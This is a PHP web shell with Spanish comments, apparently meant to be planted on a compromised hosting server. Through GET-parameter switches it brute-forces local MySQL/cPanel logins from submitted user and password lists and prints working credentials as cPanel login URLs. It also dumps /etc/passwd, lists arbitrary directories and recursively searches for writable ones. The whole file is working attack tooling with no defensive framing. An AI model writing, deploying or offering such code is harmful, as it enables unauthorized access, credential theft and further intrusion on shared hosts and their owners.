<?php
@set_time_limit(0);
@error_reporting(0);
//------------------FUNCION PARA CRACKEAR CPANELS------------------------------------------

//------------------FUNCION PARA CRACKEAR CPANELS------------------------------------------
if ($_GET[cpanel] == "1")
//echo "";
{
//Recuperamos el user y pass por GET
if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                                echo "cPanel: $user-$pass <IP>:2082/login/?login_only=1&user=$user&pass=$pass)";
                $ok++;
            }
         }
        }
    }
    exit;
}
}
}
//------------------FIN FUNCION PARA CRACKEAR CPANELS----------------------------------------

//------------------RECUPERAR USUARIOS----------------------------------------
if ($_GET[usuarios] == "1")
{
// echo file_get_contents("/etc/passwd")."<br>"; // alternativo
$UsuariosFile = readfile; echo $UsuariosFile("/etc/passwd");
}
//------------------FIN RECUPERAR USUARIOS----------------------------------------

//------------------LISTA LOS DIRECTORIOS----------------------------------------

if ($_GET[directorios] == "1")
{
$dir =	htmlspecialchars($_GET["dir"]);
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            echo $file . "  =  ". filetype($dir . $file) . '<br>';
        }
        closedir($dh);
    }
}
}

//------------------FIN LISTA LOS DIRECTORIOS----------------------------------------


//------------------LISTA LOS DIRECTORIOS CON PERMISOSOS DE ESCRITURA----------------------------------------
if ($_GET[directoriosconpermisos] == "1")
{

$dir =	htmlspecialchars($_GET["dir"]);
listar_directorios_ruta($dir);
//FUNCION PARA LISTAR DIRECTORIOS
}
function listar_directorios_ruta($ruta){ 
   // abrir un directorio y listarlo recursivo 
   if (is_dir($ruta)) { 
      if ($dh = opendir($ruta)) { 
         while (($file = readdir($dh)) !== false) { 
            //esta l&#237;nea la utilizar&#237;amos si queremos listar todo lo que hay en el directorio 
            //mostrar&#237;a tanto archivos como directorios 
            //echo "<br>Nombre de archivo: $file : Es un: " . filetype($ruta . $file); 
            if (is_dir($ruta . $file) && $file!="." && $file!=".."){
			
               //solo si el archivo es un directorio, dis tinto que "." y ".."
				if (is_writable($ruta)) {
               echo "<br>$ruta$file"."/";
			   }  
               listar_directorios_ruta($ruta . $file . "/");
            } 
         } 
      closedir($dh); 
      } 
   }else 
      echo "<br>ERROR: RUTA NO VALIDA"; 
}

//------------------FIN LISTA LOS DIRECTORIOS CON PERMISOSOS DE ESCRITURA----------------------------------------
?>

